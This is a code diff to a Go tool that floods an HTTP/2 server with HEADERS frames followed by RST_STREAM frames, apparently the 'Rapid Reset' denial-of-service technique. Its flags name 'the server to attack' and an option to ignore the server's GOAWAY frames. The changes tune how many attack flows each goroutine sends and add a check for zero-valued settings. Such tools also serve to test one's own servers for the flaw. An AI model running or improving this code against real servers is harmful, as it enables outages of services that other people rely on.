@@ -7,6 +7,7 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"math"
 	"net/http"
 	"net/url"
 	"os"
@@ -78,7 +79,7 @@ func (rfs *ReadFrameSummary) Add(rfr ReadFrameResult) {
 	rfs.ErrorEvents = errs[2] + rfs.ErrorEvents
 }
 
-var frames = flag.Uint("attempts", 1, "maximum attempts per routine")
+var flows = flag.Uint("frames", 1, "maximum attempts per routine")
 var sleep = flag.Uint("delay", 1, "delay between sending HEADERS and RST_STREAM frames")
 var ignoreGoAway = flag.Bool("ignoreGoAway", false, "ignore GOAWAY frames sent by the server")
 var serverUrl = flag.String("url", "https://localhost:443/", "the server to attack")
@@ -163,8 +164,15 @@ func main() {
 	if err != nil {
 		log.Fatalf("invalid server url: %v", err)
 	}
-	
-	*frames = *frames / *consecutiveSends / *routines
+
+	if *flows == 0 || *consecutiveSends == 0 || *routines == 0 {
+		log.Printf("frames (with value %d), consecutiveSends (with value %d) or routines (with value %d) was 0.\n\t\tNo attack can be performed using this configuration.", 
+			*flows, *consecutiveSends, *routines)
+		os.Exit(0)
+	}
+
+	*flows = uint(math.Ceil(float64(*flows) / float64(*consecutiveSends) / float64(*routines)))
+	log.Printf("each routine will send execute %d flows, sending %d HEADERS frames consecutively on %d routines", *flows, *consecutiveSends, *routines)
 
 	conf := &tls.Config{
 		InsecureSkipVerify: *skipVerify,
@@ -350,7 +358,7 @@ func attack(framer *http2.Framer, url *url.URL, streamCounter *uint32, lock *syn
 	opened := make([]uint32, *consecutiveSends)
 	hp := createHeaderFrameParam(url, 0)
 
-	for i := uint(0); i < *frames; i++ {
+	for i := uint(0); i < *flows; i++ {
 		for j := uint(0); j < *consecutiveSends; j++ {
 			if lock != nil {
 				lock.Lock()
